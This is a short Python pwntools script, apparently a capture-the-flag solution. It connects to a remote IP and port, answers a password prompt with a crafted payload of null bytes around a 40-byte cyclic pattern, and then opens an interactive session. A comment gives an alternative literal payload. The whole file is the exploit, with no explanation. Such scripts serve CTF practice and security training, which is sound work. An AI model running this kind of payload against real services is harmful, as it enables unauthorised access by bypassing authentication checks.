from pwn import *


io = remote("45.76.91.112", 10051)

io.recvuntil(b"Enter password:")

message = flat(
    0,
    cyclic(40),
    0
)
io.sendline(message)
# Another possible message would be "\x00aaaaabbbbbcccccdddddeeeeefffffggggghhhhhiii\x00\x00\x00\x00"

io.interactive()
